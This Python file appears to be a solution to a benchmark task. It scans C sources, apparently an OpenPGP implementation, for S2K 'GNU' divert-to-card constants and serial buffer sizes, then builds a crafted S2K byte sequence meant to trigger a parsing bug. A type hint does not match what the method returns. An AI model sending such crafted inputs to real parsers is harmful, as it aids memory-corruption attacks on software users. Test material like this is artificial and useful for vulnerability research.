import os
import re
import tarfile
from typing import Iterator, Optional, Tuple


class Solution:
    def _iter_text_files_from_tar(self, tar_path: str) -> Iterator[Tuple[str, str]]:
        try:
            with tarfile.open(tar_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name
                    lname = name.lower()
                    if not any(lname.endswith(ext) for ext in (".c", ".h", ".cc", ".cpp", ".inc", ".y", ".l")):
                        continue
                    if m.size <= 0 or m.size > 2_000_000:
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                    except Exception:
                        continue
                    try:
                        txt = data.decode("utf-8", "ignore")
                    except Exception:
                        try:
                            txt = data.decode("latin-1", "ignore")
                        except Exception:
                            continue
                    yield (name, txt)
        except Exception:
            return

    def _iter_text_files_from_dir(self, dir_path: str) -> Iterator[Tuple[str, str]]:
        for root, _, files in os.walk(dir_path):
            for fn in files:
                lname = fn.lower()
                if not any(lname.endswith(ext) for ext in (".c", ".h", ".cc", ".cpp", ".inc", ".y", ".l")):
                    continue
                path = os.path.join(root, fn)
                try:
                    st = os.stat(path)
                except Exception:
                    continue
                if st.st_size <= 0 or st.st_size > 2_000_000:
                    continue
                try:
                    with open(path, "rb") as f:
                        data = f.read()
                except Exception:
                    continue
                try:
                    txt = data.decode("utf-8", "ignore")
                except Exception:
                    try:
                        txt = data.decode("latin-1", "ignore")
                    except Exception:
                        continue
                yield (path, txt)

    def _iter_texts(self, src_path: str) -> Iterator[Tuple[str, str]]:
        if os.path.isdir(src_path):
            yield from self._iter_text_files_from_dir(src_path)
        else:
            yield from self._iter_text_files_from_tar(src_path)

    def _infer_params(self, src_path: str) -> Tuple[int, int, bool]:
        ext_val: Optional[int] = None
        mode_val: Optional[int] = None
        serial_buf_sizes = []
        likely_length_prefixed = 0
        likely_nul_terminated = 0

        re_define_divert = re.compile(r"#\s*define\s+[\w]*DIVERT[\w]*TO[\w]*CARD[\w]*\s+(\d+)")
        re_enum_divert = re.compile(r"\bDIVERT[\w]*TO[\w]*CARD\b\s*=\s*(\d+)")
        re_salt3_eq = re.compile(r"salt\s*\[\s*3\s*\]\s*==\s*(\d+)")
        re_mode_gnu = re.compile(r"#\s*define\s+[\w]*S2K[\w]*GNU[\w]*\s+(\d+)")
        re_mode_101 = re.compile(r"\bmode\b\s*==\s*101\b|\bmode\b\s*==\s*0x65\b")
        re_serial_buf = re.compile(r"\bchar\s+[A-Za-z_]\w*serial\w*\s*\[\s*(\d+)\s*\]")
        re_uc_serial_buf = re.compile(r"\bunsigned\s+char\s+[A-Za-z_]\w*serial\w*\s*\[\s*(\d+)\s*\]")

        for _, txt in self._iter_texts(src_path):
            low = txt.lower()

            for m in re_mode_gnu.finditer(txt):
                try:
                    v = int(m.group(1), 0)
                    if 0 < v < 256:
                        mode_val = v
                except Exception:
                    pass

            if mode_val is None and re_mode_101.search(txt):
                mode_val = 0x65

            for m in re_define_divert.finditer(txt):
                try:
                    v = int(m.group(1), 0)
                    if 0 < v < 256:
                        ext_val = v
                except Exception:
                    pass

            for m in re_enum_divert.finditer(txt):
                try:
                    v = int(m.group(1), 0)
                    if 0 < v < 256:
                        ext_val = v
                except Exception:
                    pass

            if "gnu" in low and "salt" in low:
                for m in re_salt3_eq.finditer(txt):
                    try:
                        v = int(m.group(1), 0)
                    except Exception:
                        continue
                    if not (0 < v < 256):
                        continue
                    start = max(0, m.start() - 200)
                    end = min(len(txt), m.end() + 200)
                    ctx = txt[start:end].lower()
                    if "divert" in ctx and "card" in ctx:
                        ext_val = v
                    elif ("serial" in ctx and "card" in ctx) and ext_val is None:
                        ext_val = v

            if ("serial" in low) and ("s2k" in low or "gnu" in low or "salt" in low):
                for m in re_serial_buf.finditer(txt):
                    try:
                        n = int(m.group(1), 0)
                        if 4 <= n <= 256:
                            serial_buf_sizes.append(n)
                    except Exception:
                        pass
                for m in re_uc_serial_buf.finditer(txt):
                    try:
                        n = int(m.group(1), 0)
                        if 4 <= n <= 256:
                            serial_buf_sizes.append(n)
                    except Exception:
                        pass

                ctx_tokens = txt.lower()
                if "strlen(" in ctx_tokens or "strcpy(" in ctx_tokens or "strncpy(" in ctx_tokens:
                    likely_nul_terminated += 2
                if "memchr" in ctx_tokens and "\\0" in ctx_tokens:
                    likely_nul_terminated += 1

                if re.search(r"\bmemcpy\s*\(\s*[A-Za-z_]\w*serial\w*\s*,", txt):
                    if re.search(r"[A-Za-z_]\w*serial\w*\s*\[\s*\w+\s*\]\s*=\s*'?\\0'?\s*;", txt) or re.search(
                        r"[A-Za-z_]\w*serial\w*\s*\[\s*\w+\s*\]\s*=\s*0\s*;", txt
                    ):
                        likely_length_prefixed += 3

                if re.search(r"\b\w*len\w*\s*=\s*\*\s*\w+\s*\+\+\s*;", txt) or re.search(r"\*\s*\w+\s*\+\+\s*;", txt):
                    likely_length_prefixed += 1

                if ("length" in ctx_tokens or "len" in ctx_tokens) and ("serial" in ctx_tokens):
                    if re.search(r"\b(serial\w*len|len\w*serial)\b", ctx_tokens):
                        likely_length_prefixed += 1

        if mode_val is None:
            mode_val = 0x65
        if ext_val is None:
            ext_val = 2

        n = 16
        if serial_buf_sizes:
            candidates = sorted(set(serial_buf_sizes))
            for c in candidates:
                if 8 <= c <= 64:
                    n = c
                    break
            else:
                n = candidates[0]

        is_length_prefixed = likely_length_prefixed > likely_nul_terminated
        return mode_val, ext_val, is_length_prefixed, n

    def solve(self, src_path: str) -> bytes:
        mode, ext_val, is_length_prefixed, n = self._infer_params(src_path)

        mode &= 0xFF
        ext_val &= 0xFF
        if n < 1:
            n = 16
        if n > 255:
            n = 255

        salt = b"GNU" + bytes([ext_val]) + (b"\x00" * 4)
        header = bytes([mode, 0x00]) + salt  # mode + hash(0) + 8-byte salt

        serial = b"0" * n
        if is_length_prefixed:
            return header + bytes([n & 0xFF]) + serial
        else:
            return header + serial + b"\x00"